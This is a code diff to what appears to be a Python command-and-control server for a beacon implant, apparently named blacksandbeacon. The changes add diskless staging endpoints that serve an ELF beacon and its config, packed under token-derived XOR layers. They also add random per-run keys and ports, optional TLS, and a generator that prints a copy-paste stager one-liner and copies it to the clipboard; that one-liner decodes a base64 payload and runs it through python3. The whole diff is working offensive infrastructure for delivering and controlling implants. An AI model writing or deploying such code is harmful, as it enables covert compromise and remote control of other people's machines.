@@ -17,29 +17,36 @@ Usage:
 """
 
 import base64
+import copy
 import csv
 import hashlib
 import hmac
 import json
 import logging
 import os
+import random
+import secrets
 import socket
+import ssl
+import subprocess
 import sys
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 from typing import Optional, Dict, Any
-from urllib.parse import unquote
+from urllib.parse import unquote, urlparse, urlunparse
 
 # Add include/ to path for config loader
 ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(ROOT / "include"))
 
 try:
-    from config_py import load_config
+    from config_py import load_config, DEFAULTS as BEACON_DEFAULTS, _derive_keys
 except ImportError:
     load_config = None
+    BEACON_DEFAULTS = None
+    _derive_keys = None
 
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
@@ -56,13 +63,47 @@ DEFAULTS = {
     "upload_dir": "sessions/uploads",
     "max_workers": 10,
     "hmac_enabled": False,
+    "stage_token": "",
+    "stage_beacon_path": str(Path(__file__).resolve().parent.parent / "build" / "beacon"),
+    "tls_cert": "",
+    "tls_key": "",
 }
 
 
+def _random_free_port() -> int:
+    """Pick a free TCP port in the ephemeral range (best-effort bind probe)."""
+    for _ in range(50):
+        port = random.randint(1025, 65535)
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.bind(("0.0.0.0", port))
+                return port
+        except OSError:
+            continue
+    raise RuntimeError("could not find a free port for the C2")
+
+
 def load_runtime_config() -> Dict[str, Any]:
-    """Load configuration from JSON file or use defaults."""
+    """Load configuration from JSON file or use defaults.
+
+    Anything not provided (config.json or environment) is generated at
+    random *per server run*: port, master key, staging token and client
+    id. Generated values are recorded in cfg["generated"] so main() can
+    print them, and they always win over the on-disk file when the
+    config is served through the staging endpoint.
+    """
     cfg_path = os.environ.get("BSB_CONFIG", str(ROOT / "config" / "config.json"))
     out = dict(DEFAULTS)
+    out["generated"] = {}
+
+    raw: Dict[str, Any] = {}
+    if os.path.isfile(cfg_path):
+        try:
+            with open(cfg_path) as f:
+                raw = json.load(f)
+        except Exception as e:
+            logging.warning("cannot read %s: %s", cfg_path, e)
+            raw = {}
 
     if load_config is not None and os.path.isfile(cfg_path):
         try:
@@ -87,12 +128,71 @@ def load_runtime_config() -> Dict[str, Any]:
             out["hmac_enabled"] = bool(
                 data.get("crypto", {}).get("hmac_enabled", out["hmac_enabled"])
             )
+            # Staging endpoints (diskless beacon delivery)
+            out["stage_token"] = str(
+                data.get("server", {}).get("stage_token", out["stage_token"])
+            )
+            out["stage_beacon_path"] = str(
+                data.get("server", {}).get("stage_beacon_path", out["stage_beacon_path"])
+            )
+            out["tls_cert"] = str(data.get("server", {}).get("tls_cert", out["tls_cert"]))
+            out["tls_key"] = str(data.get("server", {}).get("tls_key", out["tls_key"]))
         except Exception as e:
             logging.warning("config load failed: %s; using defaults", e)
 
     out["host"] = os.environ.get("BSB_C2_HOST", out["host"])
     port_env = os.environ.get("BSB_C2_PORT")
     out["port"] = int(port_env) if port_env else int(out["port"])
+    # Staging overrides via environment
+    out["stage_token"] = os.environ.get("BSB_STAGE_TOKEN", out["stage_token"])
+    out["stage_beacon_path"] = os.environ.get(
+        "BSB_STAGE_BEACON", out["stage_beacon_path"]
+    )
+    out["tls_cert"] = os.environ.get("BSB_TLS_CERT", out["tls_cert"])
+    out["tls_key"] = os.environ.get("BSB_TLS_KEY", out["tls_key"])
+
+    # --- Random generation: anything not provided via config/env is
+    # fresh per server run (so every execution has new secrets) ---
+    port_provided = bool((raw.get("c2", {}) or {}).get("port")) or bool(
+        os.environ.get("BSB_C2_PORT")
+    )
+    if not port_provided:
+        out["port"] = _random_free_port()
+        out["generated"]["port"] = out["port"]
+        # Point the runtime C2 URL at the generated port so the served
+        # config and the one-liner agree with the actual listener.
+        u = urlparse(str(out["url"]))
+        host = u.hostname or "127.0.0.1"
+        if host in ("0.0.0.0", "::", ""):
+            host = "127.0.0.1"
+        out["url"] = urlunparse((u.scheme, f"{host}:{out['port']}", u.path, "", "", ""))
+
+    crypto_raw = raw.get("crypto", {}) or {}
+    key_provided = bool(crypto_raw.get("master_key_hex") or crypto_raw.get("aes_key_hex"))
+    if not key_provided:
+        master_hex = secrets.token_hex(32)
+        out["generated"]["master_key_hex"] = master_hex
+        out["aes_key_hex"] = master_hex
+        out["master_key_hex_runtime"] = master_hex
+        if _derive_keys is not None:
+            enc, hmac_k = _derive_keys(bytes.fromhex(master_hex))
+            out["encryption_key"] = enc
+            out["hmac_key"] = hmac_k
+
+    token_provided = bool((raw.get("server", {}) or {}).get("stage_token")) or bool(
+        os.environ.get("BSB_STAGE_TOKEN")
+    )
+    if not token_provided:
+        out["stage_token"] = secrets.token_hex(16)
+        out["generated"]["stage_token"] = out["stage_token"]
+
+    client_id = (raw.get("c2", {}) or {}).get("client_id")
+    if client_id:
+        out["client_id"] = client_id
+    else:
+        out["client_id"] = "bsb-" + secrets.token_hex(4)
+        out["generated"]["client_id"] = out["client_id"]
+
     # Use derived encryption key if available, else fall back to legacy aes_key_hex
     if out.get("encryption_key"):
         out["aes_key"] = out["encryption_key"]
@@ -266,6 +366,187 @@ def decrypt_data_replay(
     # Return payload without counter/timestamp (16 bytes)
     payload = decrypted[16:]
     return payload, counter, timestamp
+
+
+# --- Staging: diskless beacon/config delivery -------------------------------
+#
+# Endpoint contract:
+#   GET /stage/beacon/<token>  -> packed beacon ELF
+#   GET /stage/config/<token>  -> packed config.json
+#
+# Packing: three XOR layers whose keys are DERIVED from the staging token
+# via HKDF-SHA256 (salt "blacksandbeacon-stage-v1", info stage-l1/2/3).
+# The response body is just base64(xor3(payload)) — no keys on the wire,
+# so captured traffic cannot be decoded without the token.
+#
+# Security note (honest): the token is the access gate AND the packing
+# key material. XOR layers are string obfuscation, NOT cryptography —
+# anyone holding the token decodes everything. The token rides in the
+# URL, so deploy behind TLS (server.tls_cert / server.tls_key) or assume
+# it is exposed to anyone who can capture traffic. The AES keys inside
+# config.json are the real operational secret; rotate after engagement.
+# Without a configured stage_token the endpoints fail closed.
+
+STAGE_BEACON_PREFIX = "/stage/beacon/"
+STAGE_CONFIG_PREFIX = "/stage/config/"
+STAGE_KEY_COUNT = 3
+STAGE_KEY_LEN = 32
+STAGE_HKDF_SALT = b"blacksandbeacon-stage-v1"
+STAGE_HKDF_INFOS = (b"stage-l1", b"stage-l2", b"stage-l3")
+
+
+def hkdf_sha256(ikm: bytes, salt: bytes, info: bytes, length: int = 32) -> bytes:
+    """RFC 5869 HKDF extract+expand. Pure stdlib so the server and the
+    stager payload implement byte-identical derivation."""
+    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
+    out, t, counter = b"", b"", 1
+    while len(out) < length:
+        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
+        out += t
+        counter += 1
+    return out[:length]
+
+
+def stage_keys(token: str) -> list:
+    """Derive the three staging XOR layers from the token."""
+    ikm = (token or "").encode("utf-8")
+    return [hkdf_sha256(ikm, STAGE_HKDF_SALT, info, STAGE_KEY_LEN) for info in STAGE_HKDF_INFOS]
+
+
+def xor_layer(data: bytes, key: bytes) -> bytes:
+    """Apply one XOR layer with a repeating key."""
+    klen = len(key)
+    return bytes(b ^ key[i % klen] for i, b in enumerate(data))
+
+
+def stage_encode(payload: bytes, token: str) -> bytes:
+    """Pack payload as base64 using token-derived XOR keys."""
+    data = payload
+    for k in stage_keys(token):
+        data = xor_layer(data, k)
+    return base64.b64encode(data) + b"\r\n"
+
+
+def stage_decode(body: bytes, token: str) -> Optional[bytes]:
+    """Inverse of stage_encode (used by tests and the stager parity check)."""
+    try:
+        data = base64.b64decode(body.strip())
+        for k in reversed(stage_keys(token)):
+            data = xor_layer(data, k)
+        return data
+    except Exception:
+        return None
+
+
+def stage_token_ok(state: C2State, token: str) -> bool:
+    """Constant-time token check; fail closed when no token configured."""
+    expected = state.cfg.get("stage_token") or ""
+    if not expected:
+        return False
+    return hmac.compare_digest(str(expected), token or "")
+
+
+def build_stage_config(state: C2State) -> bytes:
+    """Build the beacon config JSON served by /stage/config.
+
+    Runtime values (random-generated key/port/client id) always win over
+    the on-disk file, so a fileless beacon agrees with *this* server
+    run. The server-only section is stripped and derived key bytes are
+    dropped (not JSON-serializable).
+    """
+    conf = copy.deepcopy(BEACON_DEFAULTS)
+    cfg_path = os.environ.get("BSB_CONFIG", str(ROOT / "config" / "config.json"))
+    if load_config is not None and os.path.isfile(cfg_path):
+        try:
+            conf = load_config(cfg_path)
+        except Exception as e:
+            logging.warning("stage config: load failed, using defaults: %s", e)
+
+    cfg = state.cfg
+    conf["c2"]["url"] = cfg.get("url") or conf["c2"]["url"]
+    if cfg.get("port") is not None:
+        conf["c2"]["port"] = int(cfg["port"])
+    if cfg.get("client_id"):
+        conf["c2"]["client_id"] = cfg["client_id"]
+    runtime_master = cfg.get("master_key_hex_runtime")
+    if runtime_master:
+        conf["crypto"]["master_key_hex"] = runtime_master
+        conf["crypto"]["aes_key_hex"] = runtime_master
+    conf["crypto"].pop("encryption_key", None)
+    conf["crypto"].pop("hmac_key", None)
+    conf.pop("server", None)
+    return json.dumps(conf, indent=2).encode()
+
+
+def handle_stage(state: C2State, kind: str, token: str) -> bytes:
+    """Serve the beacon ELF or the config.json through the staging contract."""
+    if not stage_token_ok(state, token):
+        logging.warning("stage %s: rejected (bad or missing token)", kind)
+        return b"STAGE_FORBIDDEN\r\n"
+
+    if kind == "beacon":
+        blob_path = state.cfg.get("stage_beacon_path") or ""
+        if not blob_path or not os.path.isfile(blob_path):
+            logging.warning("stage beacon: file not found: %s", blob_path)
+            return b"STAGE_UNAVAILABLE\r\n"
+        blob = Path(blob_path).read_bytes()
+        if blob[:4] != b"\x7fELF":
+            logging.error("stage beacon: %s is not an ELF", blob_path)
+            return b"STAGE_UNAVAILABLE\r\n"
+    elif kind == "config":
+        try:
+            blob = build_stage_config(state)
+        except Exception as e:
+            logging.error("stage config: build failed: %s", e)
+            return b"STAGE_UNAVAILABLE\r\n"
+    else:
+        return b"STAGE_FORBIDDEN\r\n"
+
+    logging.info("stage %s: served (%d bytes)", kind, len(blob))
+    return stage_encode(blob, token)
+
+
+STAGE_PAYLOAD_PATH = Path(__file__).resolve().parent / "stage_payload.py"
+
+
+def build_stage_oneliner(cfg: Dict[str, Any]) -> str:
+    """Build the copy-paste stager one-liner for the current config.
+
+    The stager payload (c2/stage_payload.py) reads URL and token from
+    environment variables, so its base64 blob is constant and the
+    one-liner is a plain pipe: decode payload, run it with env vars set.
+    """
+    payload = STAGE_PAYLOAD_PATH.read_bytes()
+    blob = base64.b64encode(payload).decode()
+    url = str(cfg.get("url", "")).rstrip("/")
+    token = str(cfg.get("stage_token", ""))
+    return (
+        f"echo {blob} | base64 -d | "
+        f"BSB_STAGE_URL='{url}' BSB_STAGE_TOKEN='{token}' python3 -"
+    )
+
+
+def copy_to_clipboard(text: str) -> bool:
+    """Copy text to the X11/Wayland clipboard; False if no tool exists."""
+    tools = (
+        ["xclip", "-selection", "clipboard"],
+        ["xsel", "--clipboard", "--input"],
+        ["wl-copy"],
+    )
+    for cmd in tools:
+        try:
+            proc = subprocess.run(
+                cmd,
+                input=text.encode(),
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=5,
+            )
+        except (FileNotFoundError, subprocess.TimeoutExpired):
+            continue
+        if proc.returncode == 0:
+            return True
+    return False
 
 
 class C2State:
@@ -469,6 +750,14 @@ def handle_request(state: C2State, selector: str) -> bytes:
                 return handle_report(state, payload)
             if method == "GET" and path.startswith("/bof/"):
                 return handle_bof(state, unquote(path[len("/bof/") :]))
+            if method == "GET" and path.startswith(STAGE_BEACON_PREFIX):
+                return handle_stage(
+                    state, "beacon", unquote(path[len(STAGE_BEACON_PREFIX) :]).strip()
+                )
+            if method == "GET" and path.startswith(STAGE_CONFIG_PREFIX):
+                return handle_stage(
+                    state, "config", unquote(path[len(STAGE_CONFIG_PREFIX) :]).strip()
+                )
 
     # Gopher-style selector (legacy)
     selector = selector.strip()
@@ -480,6 +769,10 @@ def handle_request(state: C2State, selector: str) -> bytes:
         )
     if selector.startswith("/bof/"):
         return handle_bof(state, selector[len("/bof/") :])
+    if selector.startswith(STAGE_BEACON_PREFIX):
+        return handle_stage(state, "beacon", selector[len(STAGE_BEACON_PREFIX) :].strip())
+    if selector.startswith(STAGE_CONFIG_PREFIX):
+        return handle_stage(state, "config", selector[len(STAGE_CONFIG_PREFIX) :].strip())
 
     return b"iUNKNOWN_SELECTOR\terror.host\t1\r\n.\r\n"
 
@@ -575,7 +868,9 @@ def serve_client(state: C2State, conn: socket.socket, addr: tuple):
 
         if _is_http_request(data):
             response = handle_request(state, data.decode("latin-1"))
-            if response.startswith(b"iUNKNOWN_SELECTOR"):
+            if response.startswith(b"iUNKNOWN_SELECTOR") or response.startswith(
+                b"STAGE_"
+            ):
                 conn.sendall(_http_response(response, "404 Not Found"))
             else:
                 conn.sendall(_http_response(response))
@@ -599,6 +894,17 @@ def serve(cfg: Dict[str, Any], state: C2State):
     sock.bind((cfg["host"], int(cfg["port"])))
     sock.listen(5)
 
+    # Optional TLS: when a cert/key pair is configured, every accepted
+    # connection is wrapped before it reaches the handler. Required for
+    # staging in production: the token rides in the URL.
+    tls_ctx = None
+    tls_cert = cfg.get("tls_cert")
+    tls_key = cfg.get("tls_key")
+    if tls_cert and tls_key:
+        tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        tls_ctx.load_cert_chain(tls_cert, tls_key)
+        print(f"[*] TLS enabled (cert={tls_cert})")
+
     executor = ThreadPoolExecutor(max_workers=cfg.get("max_workers", 10))
     try:
         while True:
@@ -608,6 +914,13 @@ def serve(cfg: Dict[str, Any], state: C2State):
                 if sock.fileno() == -1:
                     break
                 continue
+            if tls_ctx is not None:
+                try:
+                    conn = tls_ctx.wrap_socket(conn, server_side=True)
+                except (ssl.SSLError, OSError) as e:
+                    logging.debug("TLS handshake failed from %s: %s", addr, e)
+                    conn.close()
+                    continue
             executor.submit(serve_client, state, conn, addr)
     except KeyboardInterrupt:
         print("\n[!] Shutting down C2 server")
@@ -654,6 +967,32 @@ def main():
     print(f"[*] HMAC: {'enabled' if cfg.get('hmac_enabled') else 'disabled'}")
     print(f"[*] Log dir: {cfg['log_dir']}")
     print(f"[*] Upload dir: {cfg['upload_dir']}")
+
+    gen = cfg.get("generated") or {}
+    if gen:
+        print("[*] Random runtime values (not provided; fresh every run):")
+        for k, v in sorted(gen.items()):
+            print(f"    {k}: {v}")
+
+    if cfg.get("stage_token"):
+        oneliner = build_stage_oneliner(cfg)
+        print("[*] Staging enabled (diskless beacon delivery)")
+        print("[*] Stager one-liner:")
+        print()
+        print(oneliner)
+        print()
+        if sys.stdin.isatty():
+            if copy_to_clipboard(oneliner):
+                print("[+] One-liner copied to clipboard")
+            else:
+                print("[!] No clipboard tool (xclip/xsel/wl-copy); copy manually")
+        else:
+            print("[*] Not a TTY: clipboard copy skipped (run interactively to copy)")
+    else:
+        print(
+            '[*] Staging disabled (add "server": {"stage_token": "<random hex>"} '
+            "to config.json to enable diskless delivery)"
+        )
 
     # Start command injector in background thread
     injector_thread = threading.Thread(
